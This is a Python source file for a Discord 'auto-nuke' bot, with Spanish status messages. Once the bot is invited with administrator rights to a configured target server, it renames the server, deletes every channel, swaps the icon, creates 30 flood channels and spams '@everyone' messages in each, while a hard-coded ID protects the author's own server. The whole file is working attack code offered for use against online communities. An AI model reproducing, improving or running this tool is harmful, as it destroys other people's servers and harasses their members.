import asyncio
import os
import sys
import json
import aiohttp
import discord
from discord.ext import commands

config_file = sys.argv[1] if len(sys.argv) > 1 else "config.json"
if os.path.exists(config_file):
    with open(config_file, "r") as f:
        config = json.load(f)
else:
    config = {
        "token": "",
        "target_guild_id": "",
        "server_name": "AUTO NUKE SYSTEM",
        "channel_name": "nuked-by-autonuke",
        "spam_message": "@everyone AUTO NUKE INVASION!",
        "icon_url": ""
    }

PROTECTED_IDS = ["1524449604446322708"]

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True 
bot = commands.Bot(command_prefix=".", intents=intents)

async def change_server_icon(guild, url):
    if not url: 
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read())
                    print("[+] Icono del servidor modificado.")
    except Exception as e:
        print(f"[-] Error al cambiar el icono del servidor: {e}")

async def execute_nuke(guild):
    if str(guild.id) in PROTECTED_IDS:
        print(f"[❌] ALERTA DE SEGURIDAD: La ID {guild.id} está protegida. Operación bloqueada.")
        return

    print(f"[!] ¡OBJETIVO DETECTADO! INICIANDO AUTO-NUKE EN: {guild.name.upper()} (ID: {guild.id})")
    
    try: 
        await guild.edit(name=config["server_name"])
        print(f"[+] Nombre del servidor cambiado a: {config['server_name']}")
    except Exception as e: 
        print(f"[-] No se pudo cambiar el nombre del servidor: {e}")

    print("[*] Eliminando todos los canales existentes...")
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    
    if config.get("icon_url"):
        asyncio.create_task(change_server_icon(guild, config["icon_url"]))
    
    print("[*] Creando canales de inundación...")
    created_channels = []
    
    for _ in range(30):
        try:
            ch = await guild.create_text_channel(name=config["channel_name"])
            created_channels.append(ch)
            print(f"[+] Canal creado: {config['channel_name']}")
        except Exception as e: 
            pass

    async def send_spam(channel):
        for _ in range(50):
            try:
                await channel.send(config["spam_message"])
                await asyncio.sleep(0.15)
            except: 
                break

    print("[+] Inyectando mensajes de spam...")
    await asyncio.gather(*[send_spam(ch) for ch in created_channels])
    print("[✔] Auto-nuke finalizado con éxito.")

@bot.event
async def on_ready():
    print(f"[✔] CONECTADO COMO: {bot.user.name.upper()} BOT")
    oauth_url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"
    print(f"[🔗] ENLACE DE INVITACIÓN DEL BOT: {oauth_url}")
    print("[*] Esperando a que el bot sea invitado al servidor objetivo...")
    
    try:
        target_id = int(config["target_guild_id"])
        guild = bot.get_guild(target_id)
        if guild:
            await execute_nuke(guild)
    except Exception as e:
        print(f"[-] Error al obtener guild objetivo: {e}")

@bot.event
async def on_guild_join(guild):
    if str(guild.id) in PROTECTED_IDS:
        print(f"[❌] SEGURIDAD: El bot entró a un servidor protegido ({guild.id}). Saliendo...")
        await guild.leave()
        return

    try:
        if guild.id == int(config["target_guild_id"]):
            await execute_nuke(guild)
    except Exception as e:
        print(f"[-] Error en on_guild_join: {e}")

if __name__ == '__main__':
    token = config.get("token")
    if not token:
        print("[❌] Error: El token no está configurado.")
        sys.exit(1)
    try:
        bot.run(token)
    except Exception as e:
        print(f"[❌] ERROR AL INICIAR BOT: {e}")
